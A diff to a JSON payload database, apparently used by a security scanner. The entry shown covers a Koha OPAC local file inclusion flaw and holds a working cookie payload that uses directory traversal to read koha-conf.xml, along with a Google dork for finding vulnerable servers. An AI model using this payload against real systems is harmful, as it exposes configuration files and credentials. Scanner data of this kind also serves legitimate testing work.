@@ -1,9 +1,9 @@
 {
     "57baddfda32f75.89104241": {
         "lTitle": "Koha Opac Local File Inclusion",
-        "lType": "Cookie Based",
+        "lType": "Cookie",
         "lMethod": "GET",
-        "lPayload": "KohaOpacLanguage=..\/..\/..\/..\/..\/..\/..\/..\/etc\/koha\/koha-conf.xml%00",
+        "lPayload": "sessionID=1;KohaOpacLanguage=..\/..\/..\/..\/..\/..\/..\/..\/etc\/koha\/koha-conf.xml%00",
         "lDescription": "<p>Affected Versions:&nbsp;LibLime Koha &lt;= 4.2<\/p>\r\n\r\n<p>Koha cgi-bin\/koha\/mainpage. pl contains&nbsp;a directory traversal vulnerability. A remote attacker may exploit this&nbsp;by means of injecting&nbsp;KohaOpacLanguage cookie to&nbsp;read arbitrary files.<\/p>\r\n\r\n<p><strong>Google Dork:&nbsp;inurl:koha\/opac-main.pl<\/strong><\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n"
     },
     "57bae40003f7c2.53182708": {
